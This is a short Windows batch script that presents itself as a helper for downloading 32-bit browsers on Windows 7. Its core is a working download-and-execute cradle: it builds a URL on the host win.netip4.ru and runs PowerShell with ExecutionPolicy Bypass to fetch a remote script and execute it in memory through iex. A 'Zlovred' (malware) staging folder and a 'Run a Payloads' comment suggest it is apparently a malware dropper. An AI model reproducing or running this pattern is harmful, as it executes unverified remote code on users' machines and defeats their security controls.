@echo on
rem *******************************************************
rem deliverexec32.bat
rem This Script will Deliver and Execute 
rem Powershell Scripts for Downloading
rem Windows 7 Internet Browsers 32-bit
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Set a Directory
rem

set CURDIR=%CD%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Set a Vatiable

set pathCMD=%SystemRoot%\system32
set REGEXE=%pathCMD%\reg.exe
set POSHEXE=%pathCMD%\WindowsPowerShell\v1.0\powershell.exe

rem Set Host Variables
rem
set aHTTP_pref=http
set aHTTP_domain=win.netip4.ru
set aHTTP_port=80
set aRemoteDir=/Apps/TOWIN/Adjust/BrowsersWindows7/Deliver/
set a_Host=%aHTTP_pref%://%aHTTP_domain%:%aHTTP_port%%aRemoteDir%

rem Set a File
rem
set aDeliveryPS=NIT-Browser32-Deliver.ps1

rem Set Local and Remote Paths
rem
set aRemotePath=%a_Host%%aDeliveryPS%
set aLocalPath=%TPDL%\%aDeliveryPS%

echo Check System Integrity....
rem
if not exist %REGEXE% echo %REGEXE% is not Found! && exit /b 1
if not exist %POSHEXE% echo %POSHEXE% is not Found! && exit /b 1
if not exist %TPDL% echo %TPDL% is not Found! && exit /b 1
rem

rem Run a Payloads...
rem
echo Download and Execute a File %aDeliveryPS%...
rem
%POSHEXE% -NoProfile -ExecutionPolicy Bypass -Command "(new-object Net.WebClient).DownloadString('%aRemotePath%') | iex"

echo The End of the Script %0
exit /b 0

